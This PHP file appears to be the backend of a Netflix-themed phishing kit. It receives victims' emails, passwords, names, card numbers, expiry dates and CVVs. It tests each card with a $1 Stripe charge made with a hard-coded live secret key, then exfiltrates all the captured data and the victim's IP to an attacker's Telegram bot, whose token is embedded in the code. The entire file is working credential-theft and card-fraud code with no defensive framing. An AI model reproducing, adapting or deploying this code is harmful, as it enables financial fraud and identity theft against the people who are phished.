<?php
error_reporting(0);
header('Content-Type: application/json');

// --- CONFIGURACIÓN ---
$token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
$chat_id = "7993722214";
$stripe_secret = "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";

// --- CAPTURA DE DATOS ---
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!$data) {
    echo json_encode(["pago" => false, "mensaje_error" => "Error al recibir datos"]);
    exit;
}

$pago_exitoso = false;
$detalle_pago = "⏳ Pendiente";

// --- PROCESO STRIPE ---
try {
    // 1. Crear Token
    $ch = curl_init("https://api.stripe.com/v1/tokens");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERPWD, $stripe_secret . ':');
    curl_setopt($ch, CURLOPT_POST, 1);
    $card = [
        'card' => [
            'number'    => str_replace(' ', '', $data['cc']),
            'exp_month' => explode('/', $data['ex'])[0],
            'exp_year'  => '20' . explode('/', $data['ex'])[1],
            'cvc'       => $data['cv'],
        ]
    ];
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($card));
    $res_token = json_decode(curl_exec($ch), true);
    curl_close($ch);

    if (isset($res_token['id'])) {
        // 2. Intentar Cargo ($1.00 USD)
        $ch2 = curl_init("https://api.stripe.com/v1/charges");
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2, CURLOPT_USERPWD, $stripe_secret . ':');
        curl_setopt($ch2, CURLOPT_POST, 1);
        $charge = [
            'amount' => 100,
            'currency' => 'usd',
            'source' => $res_token['id'],
            'description' => 'Membresia: ' . $data['em']
        ];
        curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query($charge));
        $res_charge = json_decode(curl_exec($ch2), true);
        curl_close($ch2);

        if (isset($res_charge['status']) && $res_charge['status'] == 'succeeded') {
            $pago_exitoso = true;
            $detalle_pago = "✅ PAGO APROBADO ($1.00)";
        } else {
            $detalle_pago = "❌ RECHAZADA: " . ($res_charge['error']['message'] ?? 'Declinada');
        }
    } else {
        $detalle_pago = "❌ ERROR DATOS: " . ($res_token['error']['message'] ?? 'Tarjeta inválida');
    }
} catch (Exception $e) {
    $detalle_pago = "⚠️ ERROR SISTEMA: " . $e->getMessage();
}

// --- ENVÍO A TELEGRAM ---
$msg = "🔔 HIT NETFLIX 🔔\n\n";
$msg .= "💰 STATUS: $detalle_pago\n";
$msg .= "📧 Email: {$data['em']}\n";
$msg .= "🔑 Pass: {$data['pw']}\n";
$msg .= "👤 Titular: {$data['nm']}\n";
$msg .= "💳 Card: {$data['cc']}\n";
$msg .= "📅 Exp: {$data['ex']}\n";
$msg .= "🔒 CVV: {$data['cv']}\n";
$msg .= "🌐 IP: " . $_SERVER['REMOTE_ADDR'];

$url_tg = "https://api.telegram.org/bot$token/sendMessage";
$ch_tg = curl_init();
curl_setopt($ch_tg, CURLOPT_URL, $url_tg);
curl_setopt($ch_tg, CURLOPT_POST, 1);
curl_setopt($ch_tg, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chat_id, 'text' => $msg]));
curl_setopt($ch_tg, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch_tg, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch_tg);
curl_close($ch_tg);

// --- RESPUESTA AL NAVEGADOR ---
echo json_encode([
    "pago" => $pago_exitoso, 
    "mensaje_error" => $detalle_pago
]);
?>
